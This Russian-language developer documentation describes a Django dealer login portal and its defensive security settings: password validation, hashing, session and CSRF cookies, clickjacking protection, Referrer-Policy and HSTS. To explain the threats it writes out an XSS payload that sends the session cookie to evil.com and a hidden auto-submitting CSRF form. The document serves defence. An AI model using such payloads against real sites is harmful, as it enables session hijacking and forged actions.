## 1. Концепция

Закрытая система: **только админ создаёт пользователей** через Django admin (логин + пароль + наименование + аватар). Никакой публичной регистрации — это исключает спам-регистрации, атаки на сброс пароля и упрощает модель угроз.

## 2. Модель `DealerProfile`

[`main/models.py`](main/models.py):

```python
class DealerProfile(models.Model):
    user       = models.OneToOneField(User, on_delete=models.CASCADE, related_name='dealer_profile')
    name       = models.CharField('Наименование / Имя', max_length=200)
    avatar     = models.ImageField('Аватар', upload_to='dealers/avatars/', blank=True, null=True)
    is_active  = models.BooleanField('Активен', default=True)
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)
```

Связан с Django `User` через `OneToOneField`. Не создавали кастомную User-модель — миграция существующего проекта на custom User слишком болезненна, а расширение через профиль закрывает задачу без рисков.

Миграция: `0026_dealerprofile.py`

## 3. Админка

[`main/admin.py`](main/admin.py) → `DealerProfileAdmin`:

- **Единая форма для создания**: логин + пароль (с подтверждением) + имя + аватар + active. Никаких прыжков между User → Profile.
- **При редактировании**: логин disabled (нельзя сменить), пароль опционален (пустые поля = не менять).
- **При удалении профиля** — автоматически удаляется связанный `User`.
- **`is_active` синхронизируется** с `User.is_active` — даёт мгновенную блокировку входа.
- Превью аватара в списке + плейсхолдер с эмодзи если аватара нет.

Раздел в админке: **"Дилеры — учётные записи"**.

## 5. Views

[`main/views.py`](main/views.py):

### `dealer_login` (GET/POST)

Декораторы:
- `@sensitive_post_parameters('password')` — пароль не светится в дебаг-страницах ошибок и логах
- `@never_cache` — браузер не кеширует страницу логина
- `@require_http_methods(['GET', 'POST'])` — другие методы → 405

Логика:
1. Если уже авторизован как дилер — редирект в кабинет.
2. При неверных credentials — возвращаем **одинаковое** сообщение "Неверный логин или пароль" (не намекаем существует ли юзер).
3. Дополнительная проверка после `authenticate()`: должен быть `DealerProfile` И `is_active=True`. Иначе — "Учётная запись неактивна".
4. Сессия живёт **8 часов** (`set_expiry`).
5. Все попытки логируются: `logger.warning` для фейлов с IP/UA, `logger.info` для успешных.
6. Поддержка `?next=/some/url/` для редиректа после логина.

### `dealer_logout` (POST/GET)

Чистит сессию, редиректит на login.

### `dealer_dashboard` (GET)

Декораторы:
- `@never_cache`
- `@login_required(login_url='dealer_login')`

Дополнительная проверка через `_get_active_dealer_profile()` — если админ деактивировал юзера прямо сейчас, при следующем запросе дилер мгновенно вылетает из системы.

## 7. Настройки безопасности

Все изменения в [`myproject/settings.py`](myproject/settings.py).

Безопасность реализована по принципу **defense in depth** (защита в глубину): несколько независимых слоёв, чтобы при пробое одного — следующие удержали систему. Дополнительно — защиты есть и в коде view (декораторы), и в шаблонах (meta-теги), и в БД-схеме (синхронизация `is_active`).

### 7.1 Валидация паролей при создании

**Файл:** `settings.py` → `AUTH_PASSWORD_VALIDATORS`

```python
AUTH_PASSWORD_VALIDATORS = [
    {'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'},
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
        'OPTIONS': {'min_length': 8},
    },
    {'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator'},
    {'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator'},
]
```

**Что проверяет каждый валидатор:**

| Валидатор | Что не пропустит |
|-----------|------------------|
| `UserAttributeSimilarityValidator` | Пароли похожие на логин/имя/email (нельзя поставить пароль `dealer1` юзеру `dealer1`) |
| `MinimumLengthValidator` (min 8) | Пароли короче 8 символов |
| `CommonPasswordValidator` | Пароли из топ-20 000 утёкших (`qwerty`, `password`, `admin123`, `12345678`) |
| `NumericPasswordValidator` | Чисто числовые пароли (`12345678`) |

**От какой атаки:** **брутфорс / подбор по словарю**. Подобрать пароль `qwerty` за миллисекунду — тривиально. Подобрать `Vum$2026_Andj` — миллиарды лет.

**Математика брутфорса** (алфавит ~70 символов: A-Z, a-z, 0-9, спецсимволы):

| Длина | Вариантов | Время перебора (10 млн/сек) |
|-------|-----------|------------------------------|
| 4 | 24 миллиона | 2.4 секунды |
| 6 | 117 миллиардов | 3.2 часа |
| **8** | **576 триллионов** | **1.8 года** |
| 10 | 2.8 квадриллиона | 8 900 лет |

**Где срабатывает:** при создании/редактировании дилера в админке — внутри `DealerProfileAdminForm.clean()` вызывается `validate_password()`. Если пароль не проходит — форма не сохраняется, показывается ошибка.

**Без этих настроек:** админ мог бы поставить пароль `123` дилеру, и тот вошёл бы в систему без проблем.

### 7.2 Хеширование паролей — PBKDF2 (встроенный)

**Файл:** `settings.py` → `PASSWORD_HASHERS`

```python
PASSWORD_HASHERS = [
    'django.contrib.auth.hashers.PBKDF2PasswordHasher',
    'django.contrib.auth.hashers.PBKDF2SHA1PasswordHasher',
    'django.contrib.auth.hashers.ScryptPasswordHasher',
]
```

**Главное правило безопасности:** пароли **никогда** не хранятся в открытом виде. В таблице `auth_user` лежит **хеш** — необратимое математическое преобразование. При логине пароль хешируется снова и сравнивается с сохранённым.

**Используется PBKDF2** — встроенный в Python алгоритм, никаких внешних зависимостей. Делает 870 000 итераций SHA-256 на каждом хешировании, что замедляет атаки перебором примерно до 10 миллионов хешей в секунду на топовой GPU. Для пароля из 8 символов случайного набора это ~660 дней перебора — больше чем достаточно для нашей закрытой системы из десятков дилеров.

**Что можно сделать сильнее (Argon2):**
Существует алгоритм Argon2 (победитель Password Hashing Competition 2015), который ~1000× устойчивее к GPU-атакам (~1800 лет на тот же 8-символьный пароль). Но требует внешнюю библиотеку `argon2-cffi` и 3 транзитивные зависимости (`argon2-cffi-bindings`, `cffi`, `pycparser`).

Для нашей ситуации (закрытая B2B-система, админ создаёт учётки, валидация паролей минимум 8 символов) — PBKDF2 более чем достаточен. Если в будущем система вырастет до сотен/тысяч дилеров или БД станет хранить ценную коммерческую инфу — можно вернуть Argon2 первым в списке `PASSWORD_HASHERS` и установить `argon2-cffi`.

### 7.3 Дилерские URL в auth-настройках

**Файл:** `settings.py`

```python
LOGIN_URL           = 'dealer_login'        # куда редиректит @login_required
LOGIN_REDIRECT_URL  = 'dealer_dashboard'    # куда вести после логина по умолчанию
LOGOUT_REDIRECT_URL = 'dealer_login'        # куда вести после logout()
```

**Что делает:** глобально говорит Django где у нас auth-флоу.

**Сценарий:** дилер вбивает в адресную строку `/dealer/cart/` без сессии:
1. View имеет декоратор `@login_required` → Django проверяет авторизацию.
2. Не авторизован → берёт `LOGIN_URL` из settings → редирект на `/dealer/login/?next=/dealer/cart/`.
3. Дилер вводит логин/пароль → попадает обратно на `/dealer/cart/` (благодаря `?next=`).

**Без этих настроек:** `@login_required` редиректил бы на дефолтный `/accounts/login/` которого у нас **нет** — пользователь получил бы 404.

### 7.4 Сессионные cookies — длительность и защита

**Файл:** `settings.py`

```python
SESSION_COOKIE_AGE         = 60 * 60 * 8   # 28800 секунд = 8 часов
SESSION_SAVE_EVERY_REQUEST = True
SESSION_COOKIE_HTTPONLY    = True
SESSION_COOKIE_SAMESITE    = 'Lax'
```

#### `SESSION_COOKIE_AGE = 60 * 60 * 8` (8 часов)

**Что делает:** через 8 часов **бездействия** сессия истекает.

**От чего защищает:** "дилер вошёл с рабочего компа, забыл выйти, утром другой человек открыл браузер и попал в его кабинет".

**Поведение с `SESSION_SAVE_EVERY_REQUEST = True`:**
- На **каждом запросе** срок жизни сессии сдвигается на +8 часов от текущего момента
- Пока дилер активно работает — таймер постоянно обнуляется, не выкидывает
- Выкинет только если **8 часов нет ни одного клика**

Реальный пример:
```
10:00  логин          → сессия живёт до 18:00
12:30  клик           → продлили до 20:30
14:00  клик           → продлили до 22:00
       ушёл, не кликает
22:30  открыл сайт    → cookie протух → редирект на login
```

**Без `SESSION_COOKIE_AGE`:** default Django = **2 недели**. Слишком долго для B2B-системы с деньгами.

#### `SESSION_COOKIE_HTTPONLY = True`

**Что делает:** cookie помечается флагом `HttpOnly` — JavaScript на странице **не может** прочитать его через `document.cookie`.

**От какой атаки:** **XSS (Cross-Site Scripting)**.

**Сценарий без `HttpOnly`:**
1. На каком-то твоём поле ввода (комментарий, поиск, форма обратной связи) не отфильтрован HTML.
2. Атакующий вставляет: `<script>fetch('https://evil.com?c='+document.cookie)</script>`
3. Любой кто откроет страницу с этим комментом — отправит **свою сессию** на сайт атакующего.
4. Атакующий копирует cookie себе в браузер и **залогинен как жертва**.

С `HttpOnly = True` — `document.cookie` просто не видит сессионный cookie, атака провалится.

**Это не отменяет надо фильтровать XSS** на уровне ввода (Django автоматически экранирует через `|escape`), но это **второй рубеж**.

#### `SESSION_COOKIE_SAMESITE = 'Lax'`

**Что делает:** браузер не отправляет сессионный cookie с **чужих сайтов** на твой при скрытых запросах.

**Три значения SameSite:**

| Значение | Когда шлёт cookie |
|----------|-------------------|
| `None` | Всегда — даже с любого стороннего сайта (включая скрытые fetch) |
| `Lax` (наш) | При прямой навигации юзером, но не при скрытых cross-site запросах |
| `Strict` | Только если юзер уже на твоём сайте (агрессивно — ломает многие сценарии) |

**От какой атаки:** **CSRF (Cross-Site Request Forgery)** — "межсайтовая подделка запросов".

**Сценарий без `Lax`:**
1. Дилер залогинен в `vum.uz` (сессионный cookie в браузере).
2. Дилер случайно зашёл на `evil.com`.
3. На `evil.com` есть скрытая форма:
```html
<form action="https://vum.uz/dealer/api/delete-everything" method="POST" id="x"></form>
<script>document.getElementById('x').submit()</script>
```
4. Браузер автоматически отправит запрос на `vum.uz` **с сессионным cookie дилера** → действие выполнится от его имени.

С `Lax` браузер не приложит cookie к запросу с чужого сайта → CSRF атака не сработает.

(У Django есть ещё CSRF-токен который тоже спасает — это **двойная защита**, всегда лучше иметь оба.)

### 7.5 CSRF cookie

**Файл:** `settings.py`

```python
CSRF_COOKIE_HTTPONLY = False       # JS должен иметь доступ
CSRF_COOKIE_SAMESITE = 'Lax'       # то же что и сессия
```

**Что такое CSRF-токен:** Django генерирует случайный токен и кладёт в **отдельный** cookie `csrftoken`. На каждой форме POST/PUT/DELETE этот токен **обязательно** должен присутствовать (в hidden поле или header). Если токен не совпадает с серверным — запрос отклоняется с **403 Forbidden**.

**Зачем `HTTPONLY = False`** (отдельно объясню — это нетипично):
Когда фронт делает AJAX-запрос (например, кнопка "Добавить в корзину" через fetch), JavaScript должен:
1. Прочитать CSRF-токен из cookie
2. Положить его в заголовок `X-CSRFToken`
3. Отправить запрос

Если бы стоял `HTTPONLY = True` — JS не смог бы прочитать токен, AJAX-запросы ломались бы.

**Почему это безопасно:** даже если атакующий с XSS-кражей токена что-то получит — без сессионного cookie (который HttpOnly) этот токен бесполезен.

**`SAMESITE = 'Lax'`** — тот же смысл что у сессии: CSRF-токен не отправляется на чужие сайты.

### 7.6 Защита от clickjacking — `X_FRAME_OPTIONS = 'DENY'`

**Файл:** `settings.py`

```python
X_FRAME_OPTIONS = 'DENY'
```

Также дублируется в `<meta http-equiv="X-Frame-Options" content="DENY">` в шаблонах login/dashboard для надёжности.

**Что делает:** браузер отказывается отрисовывать любую страницу твоего сайта внутри `<iframe>` на чужом сайте.

**От какой атаки:** **Clickjacking** (буквально "кража кликов").

**Сценарий:**
1. Атакующий создаёт `evil.com` со страницей: "Получите 50% скидку! [красивая кнопка]".
2. Поверх этой кнопки делает **прозрачный iframe** загружающий `https://vum.uz/dealer/cart/checkout` где у дилера готов заказ.
3. В iframe кнопка "Оформить заказ" оказывается точно под видимой "Получить скидку".
4. Дилер (уже залогиненный в `vum.uz` в той же сессии) кликает на "Скидку" — реально кликает на "Оформить заказ" → списываются деньги.

С `X_FRAME_OPTIONS = 'DENY'`:
- Браузер видит заголовок ответа от `vum.uz` → "DENY" → отказывается отрисовывать в iframe
- Атакующий видит пустой квадрат вместо твоего сайта
- Кликать не на что → атака провалилась

**Альтернативы:**
- `'SAMEORIGIN'` — можно встраивать с того же домена (например для виджетов). У нас `'DENY'` — нельзя нигде.
- Современная замена — `Content-Security-Policy: frame-ancestors`, но `X_FRAME_OPTIONS` поддерживается всеми браузерами, включая старые.

### 7.7 Referrer Policy — `same-origin`

**Файл:** `settings.py`

```python
SECURE_REFERRER_POLICY = 'same-origin'
```

**Что такое Referer:** когда юзер кликает ссылку с одной страницы на другую, браузер отправляет заголовок `Referer:` с URL **откуда пришёл**. Это нужно сайтам для аналитики, но утекает информация.

**По умолчанию (без настройки):** при клике с `vum.uz/dealer/orders/12345/secret-token-xyz` на любую внешнюю ссылку (например ссылка на инструкцию по запчасти на сайте производителя) — в `Referer` улетит **полный URL** включая `/dealer/orders/12345/secret-token-xyz`. Внешний сервер увидит твою внутреннюю структуру URL.

**С `same-origin`:**
- Переход **внутри** сайта (`vum.uz` → `vum.uz`) → `Referer` полный, нормальная аналитика работает
- Переход **наружу** (`vum.uz` → `manufacturer.com`) → `Referer` **вообще не отправляется**

**Защищает от:**
- Утечки внутренних URL дилерского кабинета внешним сервисам
- Утечки токенов в query-string если они были (best practice — токены не пихать в URL, но это страховка)
- Внешние аналитики (Google, Yandex, реклама) не узнают какую внутреннюю страницу смотрел дилер

### 7.8 HSTS — только в проде (`if not DEBUG:`)

**Файл:** `settings.py`, секция `if not DEBUG:`

```python
if not DEBUG:
    SECURE_SSL_REDIRECT            = True
    SESSION_COOKIE_SECURE          = True
    CSRF_COOKIE_SECURE             = True
    SECURE_HSTS_SECONDS            = 60 * 60 * 24 * 365   # 1 год
    SECURE_HSTS_INCLUDE_SUBDOMAINS = True
    SECURE_HSTS_PRELOAD            = True
```

#### `SECURE_SSL_REDIRECT = True`
Любой HTTP-запрос редиректится на HTTPS. Если кто-то набрал `http://vum.uz/dealer/login/` — попадёт на `https://vum.uz/dealer/login/`.

#### `SESSION_COOKIE_SECURE = True` / `CSRF_COOKIE_SECURE = True`
Cookies помечаются флагом `Secure` — браузер шлёт их **только** по HTTPS, никогда по HTTP. Если кто-то перехватит HTTP-трафик (атака MITM в открытом Wi-Fi) — cookies не светятся.

#### HSTS — `SECURE_HSTS_SECONDS`

**Что делает:** браузер при первом успешном HTTPS-визите запоминает: **"этот сайт ТОЛЬКО через HTTPS, никогда HTTP, на год вперёд"**.

**От какой атаки:** **SSL-stripping / MITM** (Man-in-the-Middle).

**Сценарий без HSTS:**
1. Дилер сидит в кафе, подключен к публичному Wi-Fi.
2. Вбивает в адресную строку `vum.uz` (без `https://`).
3. Браузер сначала пробует **HTTP**.
4. Хакер в той же Wi-Fi сети перехватывает HTTP-запрос → отвечает поддельной страницей `vum.uz` без HTTPS.
5. Дилер видит обычный сайт, вводит логин/пароль.
6. Хакер получает credentials → идёт на настоящий `https://vum.uz` сам залогиниваться.

**С HSTS:**
- После первого захода на HTTPS-версию — браузер **на год** запомнит "только HTTPS для vum.uz".
- При наборе `vum.uz` браузер **сразу** идёт на HTTPS, минуя HTTP-фазу.
- Хакер не может подставить HTTP-страницу — браузер просто откажется её показывать.

**Параметры:**
- `SECURE_HSTS_SECONDS = 60 * 60 * 24 * 365` — браузер помнит правило 1 год после последнего визита
- `SECURE_HSTS_INCLUDE_SUBDOMAINS = True` — правило распространяется на все поддомены (`api.vum.uz`, `lk.vum.uz`, любой `*.vum.uz`)
- `SECURE_HSTS_PRELOAD = True` — разрешает заявку в **встроенный список HSTS** в Chrome/Firefox/Safari (подача вручную на [hstspreload.org](https://hstspreload.org)). После добавления даже **самый первый** заход с любого нового устройства мира пойдёт через HTTPS.

**Почему только на проде (`if not DEBUG:`):**
Локально работаем по HTTP (`http://localhost:8000`). Если бы HSTS активировался локально — браузер бы запомнил "localhost только HTTPS" и перестал бы открывать локалку. С `if not DEBUG:` локально HSTS-заголовки **не отправляются**, ничего не залипает.

⚠️ **Опасность HSTS** (повторяю — это критично):
Если когда-то на проде SSL-сертификат истёк или сломался — браузеры дилеров **не пустят** на сайт до устранения. И нельзя сказать "просто кликни 'продолжить опасно'" — HSTS строго запрещает обход. Включать HSTS только при настроенном **автообновлении** сертификата (например Let's Encrypt + certbot, обновление каждые 60 дней автоматически).

### 7.9 Безопасность в коде view

Помимо settings, защиты реализованы в самих [`main/views.py`](main/views.py) → `dealer_login`/`dealer_logout`/`dealer_dashboard`.

#### `@sensitive_post_parameters('password')`

Django при ошибке (500) показывает дебаг-страницу со всеми переменными (если `DEBUG=True`) и пишет их в `logs/errors.log` (если `DEBUG=False`). Без этого декоратора в логах могут засветиться пароли в открытом виде.

С декоратором поле `password` в POST-данных заменяется на `'***'` во всех дебаг-выводах и в логах ошибок.

#### `@never_cache`

Добавляет заголовки `Cache-Control: no-cache, no-store, must-revalidate`. Страницы login и dashboard не кешируются ни браузером, ни прокси-серверами.

**Защищает от:** "Дилер вышел из системы → нажал кнопку «назад» в браузере → увидел свой кабинет из кеша". С `never_cache` браузер запросит страницу заново → редирект на login.

#### `@require_http_methods(['GET', 'POST'])`

Любые методы кроме разрешённых (`PUT`, `DELETE`, `PATCH`, `TRACE`, `OPTIONS`) → ответ 405 Method Not Allowed. Защищает от попыток обойти CSRF через нестандартные методы.

#### Одинаковое сообщение при неверном логине/пароле

```python
messages.error(request, 'Неверный логин или пароль.')
```

Не намекаем "юзер не найден" vs "пароль неверный". Иначе атакующий мог бы **энумерировать существующих юзеров** (перебрать словарь логинов и собрать список валидных) → потом точечно подбирать пароли только им.

#### Двойная проверка `_get_active_dealer_profile`

После `authenticate()` (стандартная проверка пароля) — дополнительно проверяется:
1. Существует ли `DealerProfile` (а не просто `User`)
2. `profile.is_active = True`
3. `user.is_active = True`

**Зачем:** если админ создал юзера через стандартный `auth.User` (без `DealerProfile`) — он не сможет войти в дилерский кабинет (только в админку, если `is_staff`). Это защита от того что в систему дилеров случайно попадёт другой тип юзера.

Также эта проверка вызывается в `dealer_dashboard` на **каждом запросе** → если админ деактивировал дилера прямо сейчас, его выкинет на следующем клике (а не через 8 часов когда сессия истечёт).

#### Ротация сессии при логине

Django при вызове `auth_login(request, user)` **автоматически** меняет session_key (генерирует новый). Это защита от атаки **session fixation**: атакующий не может "подсунуть" жертве свой session_key до её логина и потом использовать его.

#### Логирование попыток

Все события записываются в `logs/errors.log`:
- `logger.warning('Dealer login failed: username=%s ip=%s ua=%s', ...)` — неудачная попытка
- `logger.warning('Dealer login blocked (no/inactive profile): username=%s', ...)` — попытка под неактивным
- `logger.info('Dealer login: username=%s ip=%s', ...)` — успешный вход
- `logger.info('Dealer logout: username=%s', ...)` — выход

При расследовании инцидента (например подозрение на брутфорс) — можно посмотреть кто и откуда стучался.

### 7.10 Безопасность в шаблонах

В обоих шаблонах ([login.html](main/templates/main/dealer/login.html) и [dashboard.html](main/templates/main/dealer/dashboard.html)) есть meta-теги:

```html
<meta http-equiv="X-Content-Type-Options" content="nosniff">
<meta http-equiv="X-Frame-Options" content="DENY">
<meta name="referrer" content="same-origin">
<meta name="robots" content="noindex, nofollow">
```

| Тег | Что делает |
|-----|------------|
| `X-Content-Type-Options: nosniff` | Браузер не "угадывает" MIME-тип файла. Защита от MIME-confusion атак (когда `.jpg` оказывается на самом деле HTML с JS) |
| `X-Frame-Options: DENY` | Дублирует серверный заголовок — нельзя встроить в iframe (страховка) |
| `referrer: same-origin` | Дублирует `SECURE_REFERRER_POLICY` на уровне страницы |
| `robots: noindex, nofollow` | Поисковики **не индексируют** страницу логина и кабинет. Никаких "вход в кабинет VUM" в Google — атакующий не найдёт |

В форме логина — атрибуты для **корректной работы с менеджерами паролей** браузера:
```html
<input autocomplete="username" autofocus>
<input autocomplete="current-password">
```

Это **повышает безопасность** — юзер не вынужден запоминать пароль (склонен ставить слабые), может полагаться на менеджер и поставить длинный сложный.

## 11. Шпаргалка: как протестировать

### Создать дилера

1. Перейти в Django admin → раздел **"Дилеры — учётные записи"** → "Добавить".
2. Заполнить:
   - Логин (например `dealer1`)
   - Пароль (минимум 8 символов, не только цифры, не похож на логин)
   - Повторить пароль
   - Наименование (например `ООО Запчасть-Сервис`)
   - Аватар (опционально)
   - Активен → ✓
3. Сохранить.

### Войти как дилер

1. Открыть `http://localhost:8000/dealer/login/`
2. Ввести логин и пароль.
3. После успешного входа — попадаешь в `/dealer/` (кабинет).

### Проверить блокировку

1. В админке снять галку **"Активен"** у дилера.
2. Дилер при следующем запросе моментально вылетает из системы.

### Проверить смену пароля админом

1. В админке отредактировать дилера.
2. Заполнить поле "Пароль" + "Повторите пароль".
3. Сохранить — новый пароль вступает в силу.
4. Если оставить поля пустыми — старый пароль не меняется.

### Логи попыток входа

Все события `dealer_login` логируются:
- Успешные → `logger.info('Dealer login: ...')`
- Неудачные → `logger.warning('Dealer login failed: ...')` с IP и user-agent
- Блокировка по `is_active` → `logger.warning('Dealer login blocked ...')`

Логи пишутся через `logger = logging.getLogger('django')` → файл `logs/errors.log` (см. `LOGGING` в `settings.py`).
